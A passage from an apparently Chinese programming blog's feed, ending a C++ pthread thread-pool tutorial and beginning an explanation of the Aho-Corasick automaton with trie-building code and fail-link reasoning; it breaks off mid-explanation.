<span class="comment">// 释放内存空间并退出</span></span><br><span class="line">                <span class="keyword">delete</span> worker;</span><br><span class="line">                <span class="built_in">pthread_exit</span>(<span class="literal">nullptr</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 判断是否空闲</span></span><br><span class="line">            <span class="keyword">if</span>(!worker-&gt;is_running) &#123;   <span class="comment">// 未运行，尝试获取任务</span></span><br><span class="line">                <span class="built_in">pthread_mutex_lock</span>(&amp;(pool-&gt;_tp_job_queue_mutex));</span><br><span class="line">                <span class="keyword">if</span>(!pool-&gt;_tp_job_queue.<span class="built_in">empty</span>()) &#123;    <span class="comment">// 获取任务</span></span><br><span class="line">                    job = (pool-&gt;_tp_job_queue).<span class="built_in">front</span>();</span><br><span class="line">                    pool-&gt;_tp_job_queue.<span class="built_in">pop</span>();</span><br><span class="line">                    worker-&gt;is_running = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">pthread_mutex_unlock</span>(&amp;(pool-&gt;_tp_job_queue_mutex));</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 已有任务，则运行</span></span><br><span class="line">                <span class="type">void</span>* res = job.<span class="built_in">func</span>(job.params);</span><br><span class="line">                <span class="built_in">printRes</span>((<span class="type">int</span>)worker-&gt;p, *(<span class="type">int</span> *)res);</span><br><span class="line">                worker-&gt;is_running = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ThreadPool</span>(<span class="type">int</span> threads_cnt, <span class="type">int</span> max_job_cnt) &#123;</span><br><span class="line">        <span class="comment">// 初始化变量</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;_tp_job_queue_mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line">        <span class="keyword">this</span>-&gt;_tp_worker_list_mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line">        <span class="keyword">this</span>-&gt;_tp_worker_list = <span class="keyword">new</span> <span class="built_in">TP_WORKER</span>(<span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;_tp_config._max_job_cnt =  max_job_cnt;</span><br><span class="line">        <span class="keyword">this</span>-&gt;_tp_config._cur_thread_cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 申请线程数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;threads_cnt; ++i) &#123;</span><br><span class="line">            <span class="built_in">create_thread</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">ThreadPool</span>() &#123;</span><br><span class="line">        <span class="built_in">DestroyThreads</span>(<span class="keyword">this</span>-&gt;_tp_config._cur_thread_cnt);</span><br><span class="line">        <span class="built_in">pthread_mutex_lock</span>(&amp;_tp_worker_list_mutex);</span><br><span class="line">        <span class="keyword">delete</span> _tp_worker_list;</span><br><span class="line">        <span class="built_in">pthread_mutex_unlock</span>(&amp;_tp_worker_list_mutex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">create_thread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        TP_WORKER* worker = <span class="keyword">new</span> <span class="built_in">TP_WORKER</span>();</span><br><span class="line">        worker-&gt;pool = <span class="keyword">this</span>;</span><br><span class="line">        worker-&gt;terminate = <span class="literal">false</span>;</span><br><span class="line">        worker-&gt;is_running = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 加入新节点时：</span></span><br><span class="line">        worker-&gt;next = <span class="keyword">this</span>-&gt;_tp_worker_list-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;_tp_worker_list-&gt;next) <span class="keyword">this</span>-&gt;_tp_worker_list-&gt;next-&gt;prev = worker;</span><br><span class="line">        worker-&gt;prev = <span class="keyword">this</span>-&gt;_tp_worker_list;</span><br><span class="line">        <span class="keyword">this</span>-&gt;_tp_worker_list-&gt;next = worker;</span><br><span class="line">        <span class="comment">// 计数器加一</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;_tp_config._cur_thread_cnt += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ret = <span class="built_in">pthread_create</span>(&amp;worker-&gt;p, <span class="literal">nullptr</span>, &amp;_thread_Callback, worker);</span><br><span class="line">        <span class="comment">// if(!ret)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">push_job</span><span class="params">(<span class="type">void</span>* (*func)(<span class="type">void</span>*), <span class="type">void</span>* params)</span> </span>&#123;</span><br><span class="line">        <span class="type">bool</span> state = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">pthread_mutex_lock</span>(&amp;_tp_job_queue_mutex);</span><br><span class="line">        <span class="keyword">if</span>(_tp_job_queue.<span class="built_in">size</span>() &lt; <span class="keyword">this</span>-&gt;_tp_config._max_job_cnt) &#123;</span><br><span class="line">            _tp_job_queue.<span class="built_in">push</span>(<span class="built_in">TP_JOB</span>(func, params));</span><br><span class="line">            state = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">pthread_mutex_unlock</span>(&amp;_tp_job_queue_mutex);</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getThreadCnt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;_tp_config._cur_thread_cnt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">DestroyThreads</span><span class="params">(<span class="type">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">pthread_mutex_lock</span>(&amp;_tp_worker_list_mutex);</span><br><span class="line">        TP_WORKER* worker = _tp_worker_list-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(number &gt; <span class="number">0</span> &amp;&amp; worker) &#123;</span><br><span class="line">            worker-&gt;terminate = <span class="literal">true</span>;</span><br><span class="line">            number --;</span><br><span class="line">            <span class="keyword">this</span>-&gt;_tp_config._cur_thread_cnt --;</span><br><span class="line">            worker = worker-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">pthread_mutex_unlock</span>(&amp;_tp_worker_list_mutex);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getThreadCnt</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></details><h2 id="更多优化"><a class="markdownIt-Anchor" href="#更多优化"></a> 更多优化</h2><p>如同哈希表一样：较小的使用率会导致哈希表的绝大多数空间被浪费；较高的使用率则会使得哈希碰撞变得更加频繁，导致性能下降；对于线程池而言，也有类似的困难：任务数目远大于线程数目的线程池无法及时处理任务队列的任务导致任务队列中充斥大量任务；而线程数目远大于任务数目则会导致大多数线程处于空闲状态，浪费系统资源。因此，动态调整线程池中线程的数目是一个值得优化的点（虽然上述代码中尚未实现，但已经封装了创建和删除线程的函数，读者可以一试之）。</p><p>在特定使用情境下，线程池也可作出不同程度的优化：例如，在Java中设定了核心线程数，即使当前有线程空闲，也会创建新的线程来执行任务；反之，如果线程池中的线程数目大于核心线程数，则会依据原先设定的生命周期销毁一部分线程，以此来达到所谓的动态平衡。</p>]]></content>
    
    
    <summary type="html">用C++实现一个线程池</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="算法" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="C++" scheme="https://blog.snowflake.zone/tags/C/"/>
    
    <category term="线程池" scheme="https://blog.snowflake.zone/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
  </entry>
  
  <entry>
    <title>AC自动机原理与实现</title>
    <link href="https://blog.snowflake.zone/posts/24/"/>
    <id>https://blog.snowflake.zone/posts/24/</id>
    <published>2024-09-15T05:06:07.000Z</published>
    <updated>2024-09-15T05:06:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题背景"><a class="markdownIt-Anchor" href="#问题背景"></a> 问题背景</h2><p>AC自动机是一个解决多模式匹配的问题的典型模型，特别是应用于字符串匹配问题。多模式匹配简单来说就是如下的问题：</p><div class="tag-plugin colorful note" color="blue"><div class="title">多模式匹配问题</div><div class="body"><p>给定一个字符串数组<code>words</code>和一个文本内容<code>s</code>，找到<code>s</code>中出现的所有属于<code>words</code>中的字符串。</p></div></div><p>许多编程语言中常用的<code>substr</code>函数（从一个字符串中找到某个子字符串）就是这个问题的一种特殊情况（即<code>words</code>中仅有一种匹配模式）。</p><h2 id="字典树"><a class="markdownIt-Anchor" href="#字典树"></a> 字典树</h2><p>在多模式匹配中，我们如何存储这些模式是首先需要解决的问题：如果使用最简单的存储方法，即将每一个模式都完全存储，那么其占用的空间将会是<code>words</code>中所有单词长度的总和。 <strong>在大数量的任务下，这个数字会很恐怖！</strong> 利用树的数据结构，很容易构造出一个较为节省空间的存储方案： <strong>将具有相同前缀的模式的重复部分合并，构造成树的形状。</strong> 例如，我们要存储单词hers和his时，就可以如下组织这棵树。我们一般称这棵树为 <strong>字典树</strong> 。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/024/1.png" alt="字典树" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">字典树</span></div></div><p>显然，在模式数量很大的情况下，这种存储方案能够为我们节省大量的存储空间。构建这棵树的方法也很简单，我们仅需遍历所有模式，在每个模式开始时，从根节点向后查找：如果已有我们需要的子节点，则直接转移至子结点上；否则，创建之。构建字典树所需要的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>w</mi><mo>×</mo><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(w\times l)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span>，其中：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>是模式长度（彼此可能不一），<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span>是模式数。</p><p>字典树构建的C++代码如下给出，供读者参考（代码说明中对一些内容作出了必要的解释，供读者选择性参考）：</p><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>字典树C++实现</span></summary><div class="body"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">AC_node</span> &#123;</span><br><span class="line">    AC_node *parent;</span><br><span class="line">    AC_node *son[<span class="number">26</span>] = &#123;<span class="literal">nullptr</span>&#125;;</span><br><span class="line">    <span class="type">bool</span> terminal = <span class="literal">false</span>;</span><br><span class="line">    AC_node *fail = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    <span class="type">int</span> depth;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">AC_node</span>(<span class="type">char</span> d, <span class="type">bool</span> t, AC_node *p, <span class="type">int</span> dep, AC_node *pt) &#123;</span><br><span class="line">        data = d;</span><br><span class="line">        terminal = t;</span><br><span class="line">        fail = p;</span><br><span class="line">        depth = dep;</span><br><span class="line">        parent = pt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AC_Automaton</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    AC_node *root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">AC_Automaton</span>() &#123;</span><br><span class="line">        root = <span class="keyword">new</span> <span class="built_in">AC_node</span>(<span class="string">&#x27;a&#x27;</span>, <span class="literal">false</span>, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="comment">// root-&gt;fail = root;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">AC_node* <span class="title">getRoot</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">addString</span><span class="params">(string&amp; s)</span> </span>&#123;</span><br><span class="line">        AC_node *p = root;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c: s) &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> <span class="built_in">AC_node</span>(c, <span class="literal">false</span>, <span class="literal">nullptr</span>, p-&gt;depth + <span class="number">1</span>, p);</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;<span class="comment">// end for</span></span><br><span class="line">        p-&gt;terminal = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></details><details class="folder" index="1"><summary><span>字典树C++实现代码解释</span></summary><div class="body"><p>上述代码中，<code>AC_node</code>类是节点的结构体：目前为止，仅需读者知道的成员变量意义如下：</p><table><thead><tr><th><strong>变量名</strong></th><th><strong>意义</strong></th></tr></thead><tbody><tr><td>AC_node *parent</td><td>指向该节点的父节点的指针</td></tr><tr><td>AC_node *son[26]</td><td>指向该节点子节点的指针</td></tr><tr><td>bool terminal</td><td>终止标记</td></tr><tr><td>char data</td><td>此节点存储的数据</td></tr><tr><td>int depth</td><td>此节点位于的深度（根节点为0）</td></tr></tbody></table><p>上述变量中的<code>son</code>指针数组的大小视字符集大小而变（在本例中，我们仅考虑26个英文小写字母，因此取值26），这样做的好处是我们可以在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>的时间内知道是否已经存在合适的子节点，若不存在则创建之，在字符集数量不大的情况下，这样做是值得的：我们仅付出了存储字符集个指针空间的代价，换取了高效的查询性能；<code>teminal</code>表示该节点是否属于一个终止节点：在构建字典树时，对每个模式的末尾字符所在的节点赋<code>terminal = true</code>表示该节点代表一个模式的终止。</p><p>其余变量的含义是显然的，在此不多赘述。</p></div></details></div><h2 id="回溯问题"><a class="markdownIt-Anchor" href="#回溯问题"></a> 回溯问题</h2><p>构建好了字典树，我们便要思考如何高效的对文本进行模式匹配。我们不妨思考一个简单的例子，在这个例子中：<code>words = [&quot;abcf&quot;, &quot;bcdg&quot;, &quot;cdef&quot;]</code>，<code>s = &quot;abcdef&quot;</code>。我们试图匹配这个字符串<code>s</code>，并找到其中出现的所有模式。首先，我们构建字典树如下。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/024/2.png" alt="构建字典树" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">构建字典树</span></div></div><p>从字符串<code>s</code>开头进行匹配，我们可以一路匹配至<code>abc</code>（如红色矩形所示），因为这都满足第一个模式。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/024/3.png" alt="匹配过程" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">匹配过程</span></div></div><p>但是，当我们试图匹配<code>d</code>时遇到了麻烦：目前正在匹配的模式的下一个字符并非<code>d</code>而是<code>f</code>，显然不构成匹配。此时，我们需要设计一个回溯策略。怎么样的回溯策略是好的？一个方法是：我们需要将已构成匹配的字符串从头开始删减，直到能够构成新的匹配。</p><p>我们暂且不论如何做到这件事，仅在这个例子中，我们可以找到如下两种情况，使得这些匹配能够容纳新的字符<code>d</code>。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/024/4.png" alt="能够容纳新字符的匹配" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">能够容纳新字符的匹配</span></div></div><p>哪种选择是更好的？我们倾向于选择<code>bcd</code>这种匹配，因为它更长。想象一下，如果我们优先选择了短的，但后续出现了字符<code>g</code>，我们将永远错过<code>bcdg</code>这种模式（因为<code>g</code>无法匹配<code>e</code>，导致我们为找到新的可能匹配正试图缩减已匹配的字符串）；反过来的话，这个问题便不再存在了。</p><p>于是我们较为形式化地描述这一过程：我们记符号<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mi>v</mi></mrow><annotation encoding="application/x-tex">f(u,c)=v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>代表从节点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span></span></span></span>匹配了字符<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>从而转移到节点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>的过程，这个表示方法也成为 <strong>转移函数</strong> 。</p><p>当我们发现<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(u,c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>不存在（如上述例子中，从<code>abc</code>试图容纳<code>d</code>的方式不存在）时，我们试图缩短<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span></span></span></span>代表的字符串，使得其能够容纳字符<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>（上述例子中，我们试图缩短<code>abc</code>来容纳字符<code>d</code>）。能够发现，我们寻找的便是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span></span></span></span>代表的字符串的 <strong>最长后缀</strong> （上述例子中，我们找到了<code>abc</code>的最长后缀<code>bc</code>）。我们记<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span></span></span></span>代表的字符串的最长后缀为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fail(u)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span></span></span></span>。如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fail(u)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span></span></span></span>能够容纳字符<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(fail(u),c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>就是我们转移到的新的匹配；否则，我们继续寻找<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fail(u)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span></span></span></span>的最长后缀，并尝试使它容纳<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>。</p><p>上述步骤循环时，如果我们回溯到了根节点，但根节点也无法容纳<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>（即没有以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>开头的模式存在，因为根节点实际上不匹配任何字符串），则该字符无法被匹配。我们跳过该字符，并从根节点开始匹配。</p><h2 id="构建ac自动机"><a class="markdownIt-Anchor" href="#构建ac自动机"></a> 构建AC自动机</h2><p>知道了上述过程，我们就可以构建AC自动机了。我们只需要在字典树上增加一些路径，使得无法构成匹配时，能够回溯到正确的位置。</p><p>假设我们需要设置<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">v=f(u,c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span 